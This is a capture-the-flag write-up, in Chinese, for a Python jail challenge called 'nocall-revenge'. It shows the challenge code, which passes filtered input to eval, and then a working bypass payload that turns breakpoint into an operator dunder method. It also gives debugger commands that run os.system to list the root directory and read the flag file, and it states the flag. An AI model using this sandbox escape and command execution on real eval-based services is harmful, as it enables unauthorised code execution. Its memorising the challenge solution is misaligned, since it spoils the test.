#Web 

## 題目

**nocall-revenge**
請連線至服務，取得 flag。
`nc chals1 20028`

```python
#!/usr/local/bin/python3
#!/usr/local/bin/python3
import unicodedata

print(open(__file__).read())

expr = unicodedata.normalize("NFKC", input("> "))

if "._" in expr:
    raise NameError("no __ %r" % expr)

if any([x in "(['\"+-*/ ])" for x in expr]):
    raise NameError("no (['\"+-*/ ]) %r" % expr)

# no response for you :>
eval(expr)
```


## 解題
1. 觀察題目：
	NFKC 正規化輸入，禁止：
	1. `._`：
	2. `[`、`'`、`\`、`"`、`+`、`-`、`*`、`/`、`]`
	最後 `eval(expr)` 執行表達式 -> 可操作 `expr`
2. 比起 [[nocall]] 新增禁止了單引號 `'` 和雙引號 `"`，引號的 `\x22` 在 Python 解析原始程式碼時，不會把它 當成引號
   -> for loop comprehension 
3.  將 `help` 所屬類別的 `__invert__` 設成 breakpoint，並用 `~help` 觸發
	```python
	{0	for	help.	__class__.	__invert__	in{breakpoint}}and~help
	```
4. 觸發 breakpoint 後會進入 Python Debugger（PDB），可以執行 Python 指令
   e.g. `!import os;os.system('id')`
   ```python
   !import os;os.system('ls /')
   ```
   ![[W4-2_ls.png|451]]
   ```python
   !import os;os.system('cat /flag_CK0Em910')
   ```
   ![[W4-2_flag.png|474]]
5. flag = `CTF{overwrite_the_operator_dunder_method_to_call_without_()}`


